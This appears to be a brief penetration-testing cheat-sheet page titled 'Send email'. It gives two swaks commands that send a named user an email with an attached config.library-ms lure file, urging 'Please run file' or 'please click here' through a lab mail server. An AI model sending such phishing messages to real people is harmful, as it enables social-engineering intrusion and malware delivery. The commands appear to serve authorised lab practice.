# Send email

{% code title="" overflow="wrap" lineNumbers="true" %}
```
swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -attach @config.library-ms --server 192.168.x.x --body "Please run file" --header "Subject: Problems"
swaks --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --auth-password test -attach config.Library-ms --server 192.168.200.199 --body "please click here" --header "Subject: Staging Script" -ap
```
{% endcode %}
